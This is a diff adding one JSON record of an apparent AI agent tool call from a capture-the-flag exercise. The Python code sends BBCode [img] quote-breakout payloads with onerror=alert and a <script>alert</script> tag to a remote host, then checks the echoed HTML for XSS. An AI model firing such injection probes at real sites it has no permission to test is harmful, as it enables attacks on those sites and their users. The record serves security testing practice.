@@ -1,0 +1,10 @@
+{
+  "tool": "py_run",
+  "arguments": {
+    "code": "\nimport re, urllib.request, urllib.parse, urllib.error\nBASE = \"http://160.202.254.160:15880/\"\nPROXY = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\nop = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))\n\ndef get(data=None):\n    d = urllib.parse.urlencode(data).encode() if data is not None else None\n    with op.open(BASE, data=d, timeout=20) as r:\n        return r.read().decode(\"gb18030\", \"replace\")\n\ndef postmark(mark):\n    body = get({\"content\": mark})\n    i = body.rfind(\"<pre>\")\n    return body[i:i+400] if i >= 0 else \"(未找到pre)\"\n\ntests = {\n    \"img正常\":      \"M1[img]http://a.b/c.png[/img]M1END\",\n    \"img引号突破\":  'M2[img]http://a.b/c.png\" onerror=\"alert(1)[/img]M2END',\n    \"img单引号\":    \"M3[img]http://a.b/c.png' onerror='alert(2)[/img]M3END\",\n    \"尖括号\":       \"M4<script>alert(3)</script>M4END\",\n}\nfor name, payload in tests.items():\n    print(\"[%s]\" % name)\n    print(\"  SENT :\", payload)\n    print(\"  ECHO :\", postmark(payload))\n    print()\n",
+    "timeout": 120,
+    "wp_purpose": "测试 BBCode [img] 是否可突破引号形成 XSS",
+    "wp_case": "ctf-fca56ff3a53c802b"
+  },
+  "operation_id": "1036e47ef3ee4b0d93f2635cda09bf9e"
+}
